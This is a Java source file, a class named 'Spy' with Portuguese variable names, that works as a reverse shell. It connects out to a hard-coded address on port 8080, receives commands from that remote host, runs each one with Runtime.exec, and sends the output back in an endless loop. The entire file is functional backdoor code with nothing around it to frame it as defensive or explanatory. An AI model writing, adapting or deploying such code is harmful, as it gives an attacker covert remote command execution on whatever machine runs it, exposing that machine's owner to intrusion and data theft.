import java.util.*;
import java.io.*;
import java.net.*;

public class Spy{

	public static void main(String args[]) throws UnknownHostException, IOException{

		final int port = 8080;
		ServerSocket servidor;
		Socket socketCliente;	
		Scanner scanner = new Scanner(System.in);
		BufferedReader reader;
		String lido = "";
		OutputStreamWriter writer;
		Runtime runtime;
		Process process;
		BufferedReader soBuffer;
		StringBuffer stringbuffer = new StringBuffer();
		
		
		try{
			socketCliente = new Socket("192.168.0.102", port);
			System.out.println("Conexao estabelecida");

			do{
				
				reader = new BufferedReader(new InputStreamReader(socketCliente.getInputStream()));
				lido = reader.readLine();
				System.out.println("Servidor SAYS: "  + lido);	
				
				runtime = Runtime.getRuntime();
				process = runtime.exec(lido);
				process.waitFor();
				

				writer = new OutputStreamWriter(socketCliente.getOutputStream());
				PrintWriter out = new PrintWriter(writer);
				
				

				soBuffer = new BufferedReader(new InputStreamReader(process.getInputStream()));
				lido = "";
				String fina = "";
				while ((lido = soBuffer.readLine()) != null) {
					System.out.println(lido);
					
					fina = fina + lido;
				}
				
				out.println( fina );
				out.flush();

			}while( true );


		}catch(Exception error){
			error.getMessage();
		}

	
	}

}
